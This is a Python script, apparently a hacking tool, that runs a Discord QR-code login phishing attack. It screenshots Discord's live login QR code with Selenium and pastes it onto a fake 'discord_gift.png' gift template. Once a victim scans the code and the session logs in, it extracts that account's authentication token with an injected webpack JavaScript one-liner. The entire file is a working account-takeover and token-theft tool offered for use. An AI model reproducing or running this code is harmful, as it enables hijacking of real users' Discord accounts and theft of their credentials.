from bs4 import BeautifulSoup
from selenium.webdriver import Chrome
from selenium.webdriver.common.keys import Keys
import time
from PIL import Image
import os
import warnings
from colorama import Fore
warnings.filterwarnings("ignore", category=DeprecationWarning) 

print("Made by vinnie the smexy hacker")
DISCORD_LOGIN_URL = "https://discord.com/login"

def paste_template():
    im1 = Image.open('template.png', 'r')
    im2 = Image.open('final_qr.png', 'r')
    resized_img = im2.resize((200,210))
    resized_img.save("final_qr.png")
    im1.paste(resized_img, (100, 387))
    im1.save('discord_gift.png', quality=95)


def setup(driver):
    # load login page
    if driver.current_url != DISCORD_LOGIN_URL:
        driver.get(DISCORD_LOGIN_URL)
    time.sleep(5)
    # wait for qr code to load
    #print(qr_code["src"])
    # screenshot discord login, this will be displayed on the server webpage
    driver.get_screenshot_as_file("discord_login.png")
    print(f"{Fore.GREEN}[+] Got Screenshot of login!{Fore.RESET}")
def crop():
    image = Image.open('discord_login.png')
    left = 1504
    right = 1856
    top = 447
    bottom = 799

    im1 = image.crop((left,top,right,bottom))
    im1.save('final_qr.png', quality=95)
    print(f"{Fore.GREEN}[+] Cropped photo{Fore.RESET}")

def get_account_token(driver):
    # script gets the token from the get token function 
    token_script = "return (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()"
    return driver.execute_script(token_script)
driver=Chrome(executable_path="/usr/local/bin/chromedriver")
setup(driver)
time.sleep(10)
crop()
paste_template()
os.system("rm -r final_qr.png")
os.system("rm -r discord_login.png")
print(f"{Fore.GREEN}[+] QR code saved into > discord_gift.png{Fore.RESET}")
getacctoken = input(f"{Fore.GREEN}[+] Get Acc Token? (only if logged in) y/n: {Fore.RESET}")
if getacctoken == 'y':
    token = get_account_token(driver)
    print(f"{Fore.GREEN}[+] Auth token is:{Fore.RESET} {token} ")
else:
    exit(1)

